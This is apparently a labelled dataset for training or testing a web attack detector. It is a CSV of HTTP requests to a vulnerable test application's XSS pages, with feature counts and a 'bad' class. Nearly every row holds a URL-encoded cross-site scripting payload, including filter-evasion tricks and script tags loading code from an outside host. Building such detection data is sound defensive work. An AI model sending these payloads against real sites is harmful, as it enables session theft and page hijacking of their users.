method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22+%26%2314%3B++javascript%3Aalert%28%27XSS%27%29%3B%22%3E,,2,2,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%5Cx2Fonerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx85javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+onload%21%23%24%25%26%28%29*%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,,0,2,0,2,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx03cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E,,0,0,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3EObject.__noSuchMethod__+%3D+Function%2C%5B%7B%7D%5D%5B0%5D.constructor._%28%27javascript%3Aalert%281%29%27%29%28%29%3C%2Fscript%3E,,2,0,0,3,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ctable+background%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22jav%09ascript%3Aalert%28%27XSS%27%29%3B%22%3E,,2,2,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cmeta+charset%3D%22x-imap4-modified-utf7%22%3E%26%3Cscript%26S1%26TS%261%3Ealert%26A7%26%281%29%26R%26UA%3B%26%26%3C%26A9%2611%2Fscript%26X%26%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3C%2Fstyle%5Cx0A%3Cimg+src%3D%22about%3Ablank%22+onerror%3Djavascript%3Aalert%281%29%2F%2F%3E%3C%2Fstyle%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cx+style%3D%22background%3Aurl%28%27x%26%231%3B%3Bcolor%3Ared%3B%2F*%27%29%22%3EXXX%3C%2Fx%3E,,2,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT%2FSRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,,0,2,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript+charset%3D%22%5Cx22%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,0,1,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22%25%28scriptlet%29s%22%3E%3C%2FOBJECT%3E,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,,2,2,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3CBGSOUND+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx0D%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx81%5Cx9Fjavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cmeta+charset%3D+%22x-imap4-modified-utf7%22%26%26%3E%26%26%3Cscript%26%26%3Ejavascript%3Aalert%281%29%26%26%3B%26%26%3C%26%26%2Fscript%26%26%3E,,0,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%22%27%60%3E%3C%5Cx3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5Cx0Dexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%5Cx10src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%21--%5Bif%5D%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript+--%3E,,0,0,2,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimage+src%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+onload%21%23%24%25%25%26%28%29*%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Djavascript%3Aalert%281%29%3E,,0,0,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3C%21+foo%3D%22%5B%5B%5BInception%5D%5D%22%3E%3Cx+foo%3D%22%5Dfoo%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,,0,4,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cvmlframe+xmlns%3Durn%3Aschemas-microsoft-com%3Avml+style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute%3Bwidth%3A100%25%3Bheight%3A100%25+src%3D%25%28vml%29s%23xss%3E%3C%2Fvmlframe%3E,,0,0,0,2,3,1,bad
GET,/vulnerabilities/xss_r/?name=1%3Canimate%2Fxmlns%3Durn%3Aschemas-microsoft-com%3Atime+style%3Dbehavior%3Aurl%28%23default%23time2%29+attributename%3Dinnerhtml+values%3D%26lt%3Bimg%2Fsrc%3D%26quot%3B.%26quot%3Bonerror%3Djavascript%3Aalert%281%29%26gt%3B%3E,,0,0,0,2,3,9,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3EReferenceError.prototype.__defineGetter__%28%27name%27%2C+function%28%29%7Bjavascript%3Aalert%281%29%7D%29%2Cx%3C%2Fscript%3E,,2,0,0,3,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cform%3E%3Cbutton+formaction%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS,,0,2,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22data%3A%5CxD4%5Cx8F%2Cjavascript%3Aalert%281%29%22%3E%3C%2Fscript%3E,,0,2,0,1,1,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+%5Cx11src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%5Cx0Donerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+%5Cx47src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx84javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx09javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx0Bcript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=--%3E%3C%21--+--%5Cx21%3E+%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,,0,0,4,1,5,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%28%22XSS%22%29%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx18javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx00%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E,,0,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=X%3Cx+style%3D%60behavior%3Aurl%28%23default%23time2%29%60+onbegin%3D%60javascript%3Aalert%281%29%60+%3E,,0,0,0,2,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%40import+%22data%3A%2C*%257bx%3Aexpression%28javascript%3Aalert%281%29%29%257D%22%3B%3C%2Fstyle%3E,,0,2,0,2,1,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,4,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5Cx00expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Djava%26%231%26%232%26%233%26%234%26%235%26%236%26%237%26%238%26%2311%26%2312script%3Ajavascript%3Aalert%281%29%3EXXX%3C%2Fa%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE1%5CxA0%5Cx8Ejavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3C%3F+foo%3D%22%3E%3Cx+foo%3D%27%3F%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%27%3E%22%3E,,2,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT+onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C%2FSCRIPT%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx07cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-%25%28payload%29s%3B%2BADw-%2FSCRIPT%2BAD4-,,0,4,0,1,4,0,bad
GET,/vulnerabilities/xss_r/?name=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,,0,2,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx20type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%3CXSS+STYLE%3D%22xss%3Aexpression%28javascript%3Aalert%281%29%29%22%3E,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxC2%5Cx85javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=--%3E%3C%21--+--%5Cx00%3E+%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,,0,0,4,1,5,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx%5Cx10onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx2Bjavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3Dd%3E%3Cdiv+style%3D%22font-family%3A%27sans%5C27%5C3B+color%5C3Ared%5C3B%27%22%3EX%3C%2Fdiv%3E%3C%2Fdiv%3E+%3Cscript%3Ewith%28document.getElementById%28%22d%22%29%29innerHTML%3DinnerHTML%3C%2Fscript%3E,,2,4,0,2,4,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%5Ba%5D%5Bb%5D%5Bc%5Dsrc%5Bd%5D%3Dx%5Be%5Donerror%3D%5Bf%5D%22alert%281%29%22%3E,,0,2,0,1,0,3,bad
GET,/vulnerabilities/xss_r/?name=%27%60%22%3E%3C%5Cx00script%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5Cx8Ajavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxEF%5CxBB%5CxBFjavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%22%27%60%3E%3Cp%3E%3Csvg%3E%3Cscript%3Ea%3D%27hello%5Cx27%3Bjavascript%3Aalert%281%29%2F%2F%27%3B%3C%2Fscript%3E%3C%2Fp%3E,,3,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Chead%3E%3Cbase+href%3D%22javascript%3A%2F%2F%22%3E%3C%2Fhead%3E%3Cbody%3E%3Ca+href%3D%22%2F.+%2F%2Cjavascript%3Aalert%281%29%2F%2F%23%22%3EXXX%3C%2Fa%3E%3C%2Fbody%3E,,0,4,0,1,3,8,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx03javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx10%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx10javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxC2%5CxA0javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,,2,2,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%5Cx0D,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=1%3Ca+href%3D%23%3E%3Cline+xmlns%3Durn%3Aschemas-microsoft-com%3Avml+style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute+href%3Djavascript%3Ajavascript%3Aalert%281%29+strokecolor%3Dwhite+strokeweight%3D1000px+from%3D0+to%3D1000+%2F%3E%3C%2Fa%3E,,0,0,0,2,9,8,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%22%27%60%3E%3C%5Cx00img+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx02cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx09%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E,,0,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3CBODY+ONLOAD%3Djavascript%3Ajavascript%3Aalert%281%29%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx2Ftype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx1Ajavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E,,2,0,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx83expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx09%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx17javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3Cevent-source+src%3D%22data%3Aapplication%2Fx-dom-event-stream%2CEvent%3Aclick%250Adata%3AXXX%250A%250A%22%3E,,0,4,0,1,2,8,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT+SRC%3D%22%25%28jpg%29s%22%3E%3C%2FSCRIPT%3E,,0,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22jav++++ascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,5,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22div1%22%3E%3Cinput+value%3D%22%60%60onmouseover%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cdiv+id%3D%22div2%22%3E%3C%2Fdiv%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML+%3D+document.getElementById%28%22div1%22%29.innerHTML%3B%3C%2Fscript%3E,,0,10,0,3,6,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%5Cx0B,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C%2Fdiv%3E,,0,0,0,2,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22x%22%3EXXX%3C%2Fdiv%3E+%3Cstyle%3E++%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D++%23y%5D%3Bcolor%3Ared%3B%7B%7D++%3C%2Fstyle%3E,,0,2,0,0,8,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+%5Cx00src%3Dx+onerror%3D%22alert%281%29%22%3E,,0,2,0,1,2,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx0Acript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%5Cx0A%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexp%5Cx5Cression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cxml+id%3D%22xss%22+src%3D%22%25%28htc%29s%22%3E%3C%2Fxml%3E+%3Clabel+dataformatas%3D%22html%22+datasrc%3D%22%23xss%22+datafld%3D%22payload%22%3E%3C%2Flabel%3E,,0,10,0,1,6,2,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE3%5Cx80%5Cx80javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3D%27%23%5Cx27+onerror%3Djavascript%3Aalert%281%29%3E,,2,1,0,1,2,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22font-family%3Afoo%7Bbar%3Bbackground%3Aurl%28http%3A%2F%2Ffoo.f%2Foo%7D%3Bcolor%3Ared%2F*%2Ffoo.jpg%29%3B%22%3EX,,0,2,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3E%25%28payload%29s%3C%2Fscript%3E,,0,0,0,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx%5Cx13onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5CxA9javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D+onmouseover%3D%22alert%28%27xxs%27%29%22%3E,,2,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5Cx89javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%60javascript%3Ajavascript%3Aalert%281%29%60%3E,,0,0,0,1,1,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/security.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E,,0,0,0,0,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3Dhttp%3A%2F%2Ffoo.bar%2F%23x%3D%60y%3E%3C%2Fa%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E%3C%2Fa%3E%22%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cembed+width%3D500+height%3D500+code%3D%22data%3Atext%2Fhtml%2C%3Cscript%3E%25%28payload%29s%3C%2Fscript%3E%22%3E%3C%2Fembed%3E,,0,2,0,1,3,2,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx89javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cx+style%3D%22behavior%3Aurl%28%25%28sct%29s%29%22%3E,,0,2,0,2,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx06cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CXSS+STYLE%3D%22behavior%3A+url%28%25%28htc%29s%29%3B%22%3E,,0,2,0,2,2,0,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx7Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx00%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E,,0,0,0,0,1,0,bad
